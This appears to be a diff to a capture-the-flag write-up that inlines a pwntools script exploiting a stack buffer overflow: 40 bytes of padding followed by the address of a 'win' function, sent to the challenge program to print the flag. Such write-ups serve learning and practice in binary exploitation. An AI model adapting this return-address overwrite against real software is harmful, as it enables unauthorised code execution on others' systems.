@@ -55,7 +55,19 @@ First let's compute the offset, using pwndbg we find that win is at `0x401227` a
   
 To finish this we write a nice script using pwntools  
 
-![pwntools script](./exploit.py)
+```python
+payload = flat(
+        b'\x00'*5*8,
+        p64(0x401227) 
+        )
+
+io = start()
+
+io.sendlineafter(b'Hi there NICC! This program is 100% and there is NO WAY you are getting our flag.\n', payload)
+
+io.recvline().decode()
+print(io.recvline().decode())
+```
 
 And we get the flag :
 
